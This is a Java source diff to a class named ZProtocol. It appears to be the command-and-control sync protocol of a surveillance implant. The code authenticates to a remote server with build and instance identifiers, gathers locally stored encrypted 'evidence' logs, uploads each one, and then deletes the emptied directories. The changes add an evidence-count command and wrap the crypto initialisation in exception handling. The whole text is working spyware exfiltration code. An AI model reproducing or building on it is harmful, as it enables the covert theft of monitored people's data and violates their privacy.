@@ -126,7 +126,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		} catch (final ProtocolException e) {
 			if (Cfg.EXCEPTION) {
@@ -136,7 +136,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		} catch (final CommandException e) {
 			if (Cfg.EXCEPTION) {
@@ -146,7 +146,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		} finally {
 			transport.close();
@@ -166,17 +166,25 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Authentication *****"); //$NON-NLS-1$
 		}
-		
+
 		// key init
-		cryptoConf.makeKey(Keys.self().getChallengeKey());
+		try {
+			cryptoConf.init(Keys.self().getChallengeKey());
+			random.nextBytes(Kd);
+			random.nextBytes(Nonce);
 
-		random.nextBytes(Kd);
-		random.nextBytes(Nonce);
+			final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
+			final byte[] response = transport.command(cypherOut);
 
-		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
-		final byte[] response = transport.command(cypherOut);
+			return parseAuthentication(response);
 
-		return parseAuthentication(response);
+		} catch (CryptoException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (authentication) Error: " + e);
+			}
+			return false;
+		}
+
 	}
 
 	/**
@@ -192,10 +200,10 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Identification *****"); //$NON-NLS-1$
 		}
-		
+
 		final byte[] response = command(Proto.ID, forgeIdentification());
 		final boolean[] capabilities = parseIdentification(response);
-		
+
 		return capabilities;
 	}
 
@@ -386,15 +394,19 @@ public class ZProtocol extends Protocol {
 		// filling structure
 		dataBuffer.write(Kd);
 		dataBuffer.write(Nonce);
+
 		if (Cfg.DEBUG) {
 			Check.ensures(dataBuffer.getPosition() == 32, "forgeAuthentication, wrong array size"); //$NON-NLS-1$
 		}
+
 		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
 		dataBuffer.write(keys.getInstanceId());
 		dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));
+
 		if (Cfg.DEBUG) {
 			Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication, wrong array size"); //$NON-NLS-1$
 		}
+
 		// calculating digest
 		final SHA1Digest digest = new SHA1Digest();
 		digest.update(Utils.padByteArray(keys.getBuildId(), 16));
@@ -446,7 +458,7 @@ public class ZProtocol extends Protocol {
 			final byte[] K = new byte[16];
 			System.arraycopy(digest.getDigest(), 0, K, 0, K.length);
 
-			cryptoK.makeKey(K);
+			cryptoK.init(K);
 			// Retrieve Nonce and Cap
 			final byte[] cypherNonceCap = new byte[32];
 			System.arraycopy(authResult, 32, cypherNonceCap, 0, cypherNonceCap.length);
@@ -906,46 +918,68 @@ public class ZProtocol extends Protocol {
 		final EvidenceCollector logCollector = EvidenceCollector.self();
 
 		final Vector dirs = logCollector.scanForDirLogs(basePath);
+
 		final int dsize = dirs.size();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " sendEvidences #directories: " + dsize); //$NON-NLS-1$
 		}
+
 		for (int i = 0; i < dsize; ++i) {
 			final String dir = (String) dirs.elementAt(i); // per reverse:
 															// dsize-i-1
 			final String[] logs = logCollector.scanForEvidences(basePath, dir);
 
 			final int lsize = logs.length;
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "    dir: " + dir + " #evidences: " + lsize); //$NON-NLS-1$ //$NON-NLS-2$
 			}
+
+			final byte[] evidenceSize = new byte[12];
+			System.arraycopy(Utils.intToByteArray(lsize), 0, evidenceSize, 0, 4);
+
+			byte[] response = command(Proto.EVIDENCE_SIZE, evidenceSize);
+
+			// Andrebbe checkato il response di questo comando
+			checkOk(response);
+
+			response = null;
+
 			// for (int j = 0; j < lsize; ++j) {
 			// final String logName = (String) logs.elementAt(j);
 			for (final String logName : logs) {
 				final String fullLogName = basePath + dir + logName;
 				final AutoFile file = new AutoFile(fullLogName);
+
 				if (!file.exists()) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " Error: File doesn't exist: " + fullLogName); //$NON-NLS-1$
 					}
+
 					continue;
 				}
+
 				final byte[] content = file.read();
+
 				if (content == null) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " Error: File is empty: " + fullLogName); //$NON-NLS-1$
 					}
+
 					continue;
 				}
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Info: Sending file: " + EvidenceCollector.decryptName(logName)); //$NON-NLS-1$
 				}
+
 				final byte[] plainOut = new byte[content.length + 4];
+
 				System.arraycopy(Utils.intToByteArray(content.length), 0, plainOut, 0, 4);
 				System.arraycopy(content, 0, plainOut, 4, content.length);
 
-				final byte[] response = command(Proto.LOG, plainOut);
+				response = command(Proto.LOG, plainOut);
 				final boolean ret = parseLog(response);
 
 				if (ret) {
@@ -954,9 +988,11 @@ public class ZProtocol extends Protocol {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
 					}
+
 					return;
 				}
 			}
+
 			if (!Path.removeDirectory(basePath + dir)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Warn: " + "Not empty directory"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -1102,17 +1138,20 @@ public class ZProtocol extends Protocol {
 	 */
 	private boolean checkOk(final byte[] result) throws ProtocolException {
 		final int res = Utils.byteArrayToInt(result, 0);
+
 		if (res == Proto.OK) {
 			return true;
 		} else if (res == Proto.NO) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: checkOk: NO"); //$NON-NLS-1$
 			}
+
 			return false;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: checkOk: " + res); //$NON-NLS-1$
 			}
+
 			throw new ProtocolException();
 		}
 	}
